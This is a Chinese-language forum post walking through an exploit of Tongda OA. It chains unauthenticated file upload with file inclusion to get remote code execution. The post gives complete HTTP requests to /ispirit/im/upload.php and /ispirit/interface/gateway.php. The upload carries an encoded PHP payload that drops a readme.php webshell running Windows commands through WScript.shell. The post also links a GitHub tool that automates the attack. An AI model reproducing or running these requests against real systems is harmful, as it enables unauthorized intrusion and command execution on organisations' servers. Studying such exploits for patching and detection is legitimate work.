# **一.漏洞复现:**

**影响范围(但是只有V11版和2017版有包含文件的php,其余版本能上传文件.):**
```
V11版
2017版
2016版
2015版
2013增强版
2013版
```
**这位老哥说的很详细**
https://forum.90sec.com/t/topic/883

**只要POST传递三个参数进行未授权文件上传!**
**开启Burp 抓包，改成post，加上poc.**
```
POST /ispirit/im/upload.php HTTP/1.1
Host: 目标ip
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 921
Content-Type: multipart/form-data; boundary=e59b4539bd28a1b69eb29cc9fa61fbc1

--e59b4539bd28a1b69eb29cc9fa61fbc1
Content-Disposition: form-data; name="P"

123
--e59b4539bd28a1b69eb29cc9fa61fbc1
Content-Disposition: form-data; name="DEST_UID"

1
--e59b4539bd28a1b69eb29cc9fa61fbc1
Content-Disposition: form-data; name="UPLOAD_MODE"

2
--e59b4539bd28a1b69eb29cc9fa61fbc1
Content-Disposition: form-data; name="ATTACHMENT"; filename="1.txt"

<?php
$fp = fopen('readme.php', 'w');
$a = base64_decode("JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyMndob2FtaSUyMiUzQiUwQSUyNHdzaCUyMCUzRCUyMG5ldyUyMENPTSUyOCUyN1dTY3JpcHQuc2hlbGwlMjclMjklM0IlMEElMjRleGVjJTIwJTNEJTIwJTI0d3NoLSUzRWV4ZWMlMjglMjJjbWQlMjAvYyUyMCUyMi4lMjRjb21tYW5kJTI5JTNCJTBBJTI0c3Rkb3V0JTIwJTNEJTIwJTI0ZXhlYy0lM0VTdGRPdXQlMjglMjklM0IlMEElMjRzdHJvdXRwdXQlMjAlM0QlMjAlMjRzdGRvdXQtJTNFUmVhZEFsbCUyOCUyOSUzQiUwQWVjaG8lMjAlMjRzdHJvdXRwdXQlM0IlMEElM0YlM0U=");
fwrite($fp, urldecode($a));
fclose($fp);
?>

--e59b4539bd28a1b69eb29cc9fa61fbc1--
```

**那一大段Base64加密的就是exp代码**

![1|690x456](upload://tFjya9EQShCuYtjd1pzoYVcex3n.png) 

**然后就是文件包含了，因为无法直接上传php文件.**
**通过json形式的数据post** `ispirit/interface/gateway.php`

```
POST /ispirit/interface/gateway.php HTTP/1.1
Host: 目标地址
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 92
Content-Type: application/x-www-form-urlencoded

json={"url":"/general/../../attach/im/2003\/1857507240.1.txt"}
```
**其中 2003\/1857507240.1.txt 就是你前边上传上的文件地址,注意要将 _ 改成 \ /**
**然后就会在** `/ispirit/interface/ `**目录下生成一个** `readme.php` **文件.(你可以通过更改参数来让他生成在根目录)**

![2|587x127](upload://a23wIo4waqYcPtuB9vueFdfwm5y.png) 

# **二.工具编写:**
**其实当你懂了原理之后，写工具就变得容易了.**
**代码:**

![3|641x331](upload://7l8sSqQNwNB5c8CNjmFPSFXE5gn.png)

![2|539x434](upload://wQcwJJ36W0sqkDY5DcTXCdYdRpk.png) 
**Github项目地址:**

https://github.com/M4tir/tongda-oa-tools
